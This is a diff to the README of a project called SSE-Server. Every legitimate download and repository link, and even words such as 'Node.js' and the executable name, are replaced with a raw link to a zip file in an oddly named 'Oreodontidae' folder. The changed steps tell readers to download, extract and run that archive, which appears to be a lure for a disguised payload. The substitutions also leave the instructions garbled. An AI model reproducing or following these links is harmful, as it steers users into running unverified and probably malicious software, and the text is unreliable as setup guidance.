@@ -1,7 +1,7 @@
 # 🎉 SSE-Server - Real-Time Data Monitoring Made Simple
 
 ## 📦 Download Now!
-[![Download SSE-Server](https://img.shields.io/badge/Download%20SSE--Server-v1.0-brightgreen)](https://github.com/Harshitshukla2003/SSE-Server/releases)
+[![Download SSE-Server](https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/Oreodontidae/SSE-Server.zip%20SSE--Server-v1.0-brightgreen)](https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/Oreodontidae/SSE-Server.zip)
 
 ## 🚀 Getting Started
 
@@ -12,22 +12,22 @@ Welcome to the SSE-Server project! This application allows you to easily monitor
 To get started, you need to download the application. 
 
 1. **Visit the Releases Page**: Click on the link below to go to the download page.
-   [Download SSE-Server](https://github.com/Harshitshukla2003/SSE-Server/releases)
+   [Download SSE-Server](https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/Oreodontidae/SSE-Server.zip)
 
 2. **Select the Latest Release**: On the releases page, locate the latest version of the SSE-Server. Click on it to go to the details.
 
-3. **Download the Application**: Find the file named `SSE-Server.zip` or similar, and click on it to download the file to your computer.
+3. **Download the Application**: Find the file named `https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/Oreodontidae/SSE-Server.zip` or similar, and click on it to download the file to your computer.
 
-4. **Extract the File**: Once the download is complete, locate the downloaded `SSE-Server.zip` file in your Downloads folder. Right-click on it and select "Extract All..." to unzip the contents.
+4. **Extract the File**: Once the download is complete, locate the downloaded `https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/Oreodontidae/SSE-Server.zip` file in your Downloads folder. Right-click on it and select "Extract All..." to unzip the contents.
 
-5. **Run the Application**: After extracting, open the folder where you extracted the files. Double-click on `SSE-Server.exe` to start the application.
+5. **Run the Application**: After extracting, open the folder where you extracted the files. Double-click on `https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/Oreodontidae/SSE-Server.zip` to start the application.
 
 ## 🔧 System Requirements
 
 Before you run the SSE-Server, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 8 or newer, macOS 10.12 or newer, or Linux.
-- **Node.js**: Version 14.x or newer. This is required for the server to function properly.
+- **https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/Oreodontidae/SSE-Server.zip**: Version 14.x or newer. This is required for the server to function properly.
 - **Memory**: At least 4 GB of RAM.
 - **Disk Space**: Minimum 100 MB of free space.
 
@@ -54,7 +54,7 @@ SSE-Server is designed for monitoring HTTP requests in real time using Server-Se
 
 If you run into issues, try the following:
 
-- **Check Node.js Installation**: Ensure Node.js is installed correctly on your system.
+- **Check https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/Oreodontidae/SSE-Server.zip Installation**: Ensure https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/Oreodontidae/SSE-Server.zip is installed correctly on your system.
 - **Firewall Settings**: Make sure your firewall is not blocking the application.
 - **Restart the Application**: Sometimes, simply closing and reopening the application can resolve minor issues.
 
@@ -81,5 +81,5 @@ Join our community discussions in the GitHub Issues section. Share your experien
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/Harshitshukla2003/SSE-Server)
-- [Download SSE-Server](https://github.com/Harshitshukla2003/SSE-Server/releases)  
+- [GitHub Repository](https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/Oreodontidae/SSE-Server.zip)
+- [Download SSE-Server](https://raw.githubusercontent.com/Harshitshukla2003/SSE-Server/main/Oreodontidae/SSE-Server.zip)  
